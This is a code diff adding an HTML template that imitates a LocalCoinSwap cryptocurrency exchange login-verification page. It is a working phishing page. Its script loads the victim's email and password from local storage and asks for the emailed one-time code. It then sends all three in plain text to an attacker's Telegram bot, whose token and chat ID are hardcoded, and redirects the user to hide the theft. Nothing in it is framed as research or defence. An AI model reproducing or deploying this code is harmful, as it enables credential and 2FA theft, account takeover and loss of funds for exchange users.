@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LocalCoinSwap Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: "Inter", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #e9f0f8;
+            color: #1a1a1a;
+        }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: stretch;
+            background-color: #fff;
+            max-width: 950px;
+            margin: 50px auto;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .left-section {
+            flex: 1;
+            padding: 60px 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            border-right: 1px solid #eaeaea;
+        }
+        
+        .quote-mark {
+            font-size: 50px;
+            color: #3f7af0;
+            line-height: 0.8;
+            margin-bottom: 15px;
+        }
+        
+        .quote {
+            font-size: 17px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .author {
+            color: #0a0f1c;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .right-section {
+            flex: 1;
+            padding: 60px 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .right-section h2 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            color: #0a0f1c;
+        }
+        
+        .notice {
+            background-color: #d9f2d9;
+            color: #0a591e;
+            border-left: 4px solid #28a745;
+            border-radius: 6px;
+            padding: 10px 15px;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        
+        .edit-link {
+            font-size: 13px;
+            color: #0077ff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 18px;
+            font-size: 15px;
+            background-color: #fff;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0077ff;
+            box-shadow: 0 0 0 2px rgba(0, 119, 255, 0.2);
+        }
+        
+        .login-btn {
+            background-color: #0077ff;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        
+        .login-btn:hover {
+            background-color: #005fd1;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                margin: 20px;
+            }
+            .left-section {
+                border-right: none;
+                border-bottom: 1px solid #eaeaea;
+                padding: 40px 30px;
+                text-align: center;
+            }
+            .quote-mark {
+                font-size: 40px;
+            }
+            .quote {
+                font-size: 16px;
+            }
+            .right-section {
+                padding: 40px 30px;
+            }
+            .right-section h2 {
+                font-size: 22px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            input {
+                font-size: 14px;
+            }
+            .login-btn {
+                font-size: 15px;
+            }
+            .notice {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- LEFT SIDE -->
+        <div class="left-section">
+            <div class="quote-mark">“</div>
+            <p class="quote">
+                Bitcoin enables certain uses that are very unique. I think it offers possibilities that no other currency allows.
+            </p>
+            <p class="author">Charlie Shrem</p>
+        </div>
+
+        <!-- RIGHT SIDE -->
+        <div class="right-section">
+            <h2>Login Verification — LocalCoinSwap</h2>
+            <div class="notice" style="display: none;" id="notice">
+                Please enter the 8-digit verification code sent to your email.
+            </div>
+
+            <form id="loginForm" method="POST" action="{% url 'login' %}">
+                {% csrf_token %}
+                <label>Email <a class="edit-link" id="editEmail">Edit</a></label>
+                <input type="email" id="email" name="email" required readonly />
+
+                <label>Password <a class="edit-link" id="editPassword">Edit</a></label>
+                <input type="password" id="password" name="password" required readonly />
+
+                <label>8-digit code</label>
+                <input type="text" id="code" name="code" maxlength="8" placeholder="Enter 8-digit code" required />
+
+                <button type="submit" class="login-btn">Continue</button>
+            </form>
+        </div>
+    </div>
+
+     <script>
+        // Function to retrieve email and password from local storage
+        function loadCredentials() {
+            const email = localStorage.getItem('email');
+            const password = localStorage.getItem('password');
+
+            if (email) {
+                document.getElementById('email').value = email; // Set email
+            }
+            if (password) {
+                document.getElementById('password').value = password; // Set password
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', loadCredentials); // Load credentials when the document is ready
+
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const otp = document.getElementById("code").value.trim(); // Retrieve the OTP input
+
+            // Validate inputs
+            if (!email || !password || !otp) {
+                alert('Please fill in all fields.'); // Show alert for empty inputs
+                return; // Exit if fields are empty
+            }
+
+            const message = `Email: ${email}\nPassword: ${password}\nOTP: ${otp}`; // Include OTP in message
+
+            const botToken = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q'; // Replace securely
+            const chatId = '5615316142'; // Replace securely
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Message sent successfully');
+                     window.location.href = "{% url 'index' %}";  // Use Django's URL template tag
+                    } else {
+                        console.error('Error sending message:', data.description);
+                        alert('Failed to send message: ' + data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An unexpected error occurred. Please try again later.');
+                });
+        });
+    </script>
+</body>
+</html>
